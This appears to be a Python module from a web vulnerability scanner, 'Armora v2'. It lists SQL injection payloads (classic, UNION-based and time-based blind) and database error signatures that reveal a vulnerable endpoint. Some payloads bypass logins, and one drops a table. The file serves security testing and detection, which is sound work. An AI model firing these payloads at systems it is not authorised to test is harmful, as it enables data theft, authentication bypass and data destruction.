"""
SQL Injection Payloads — Armora v2.

Error-based, UNION-based, and time-based blind payloads.
Each payload is designed to trigger detectable behaviour differences
when an endpoint is vulnerable.
"""

# ---------- Error-based / Classic ----------
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; DROP TABLE test--",
    "1; WAITFOR DELAY '0:0:0'--",
    "admin'--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' AND SLEEP(0)--",
    "') OR ('1'='1",
]

# ---------- Time-based blind ----------
SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "'; SELECT pg_sleep(5)--",
]

# ---------- Known SQL error signatures ----------
SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "warning: mysql",
    "unclosed quotation mark",
    "microsoft ole db provider for sql server",
    "microsoft sql native client error",
    "postgresql query failed",
    "pg_query()",
    "pg_exec()",
    "unterminated quoted string",
    "syntax error at or near",
    "ora-01756",
    "ora-00933",
    "quoted string not properly terminated",
    "sqlstate",
    "sql syntax",
    "sqlite3.operationalerror",
    "jdbc.sqlerror",
    "com.mysql.jdbc",
    "org.postgresql",
]
